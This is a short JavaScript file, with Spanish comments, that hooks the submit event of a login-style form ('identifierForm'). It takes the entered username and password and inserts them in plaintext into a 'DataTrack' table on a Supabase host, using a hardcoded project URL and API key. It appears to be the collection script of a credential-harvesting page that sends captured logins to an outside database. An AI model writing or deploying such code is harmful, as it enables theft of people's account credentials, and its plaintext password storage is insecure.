import { createClient } from "@supabase/supabase-js";
const supabaseUrl = "https://pahbxnmbixuxrmtyutzj.supabase.co";
const supabaseKey =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBhaGJ4bm1iaXh1eHJtdHl1dHpqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDkwNTY2MDEsImV4cCI6MjA2NDYzMjYwMX0.vVeLfym30Zl1utCSesTcTcLHttiYasPkW5h7cJYgVzk";
const supabase = createClient(supabaseUrl, supabaseKey);

const trackSave = () => {
  document
    .getElementById("identifierForm")
    .addEventListener("submit", async function (event) {
      event.preventDefault(); // Evita el envío del formulario por defecto

      // Obtiene los valores de los campos del formulario
      const username = document.getElementById("username").value;
      const password = document.getElementById("tpassword").value;

      // Elimina el campo 'id: 1' para evitar conflicto de clave primaria
      const { error } = await supabase
        .from("DataTrack")
        .insert({ username: username, password: password });

      if (error) {
        console.error("Error al guardar en Supabase:", error.message);
        alert("Error al guardar los datos.");
      } else {
        alert("Datos guardados correctamente.");
        // Opcional: limpiar el formulario
        document.getElementById("identifierForm").reset();
      }
    });
};

trackSave();
